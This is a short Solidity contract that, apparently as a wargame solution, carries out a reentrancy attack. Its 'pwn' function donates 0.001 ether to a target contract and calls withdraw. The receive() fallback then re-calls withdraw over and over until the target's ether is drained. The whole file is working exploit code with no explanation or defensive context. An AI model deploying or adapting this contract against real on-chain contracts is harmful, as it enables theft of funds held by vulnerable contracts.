// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

contract Contract {

    address private reentrantTarget; 
    constructor() payable {}

    function pwn(address target) public {
        reentrantTarget = target;
        (bool result, ) = target.call{value: 0.001 ether}(abi.encodeWithSignature("donate(address)", address(this)));
        require(result, "transaction failed");
        (bool success, bytes memory bal) = target.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        uint256 balance = abi.decode(bal, (uint256));
        require(balance == 0.001 ether, "wrong balance");
        (bool success2, ) = target.call(abi.encodeWithSignature("withdraw(uint256)", 0.001 ether));

    }

    receive() external payable {
        if (msg.sender == reentrantTarget && msg.sender.balance > 0) {
            (bool balResult, bytes memory bal) = msg.sender.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
            uint256 balance = abi.decode(bal, (uint256));
            uint256 callValue;
            if (msg.sender.balance >= balance) {
                callValue = balance;
            } else {
                callValue = msg.sender.balance;
            }
            (bool result, ) = msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", callValue));
        }


    }
}
